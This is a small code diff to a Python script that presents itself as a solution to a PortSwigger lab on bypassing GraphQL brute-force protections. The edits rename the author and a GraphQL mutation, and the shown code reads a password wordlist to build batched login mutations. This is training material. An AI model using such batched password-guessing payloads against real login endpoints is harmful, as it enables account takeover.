@@ -1,4 +1,4 @@
-# Created by WafflesExploit
+# Created by WafflesExploits
 # Solution to PortSwigger's Lab: Bypassing GraphQL brute force protections
 Wordlist = 'pass.txt'
 Output = 'output.txt'
@@ -16,7 +16,7 @@ def getString_Template(i, username, password):
 
 file = open(Output, "w+")
 
-file.write("mutation {")
+file.write("mutation login{")
 
 i = 0
 with open(f'{Wordlist}') as f: # Opens and automatically closes the passwordfile.
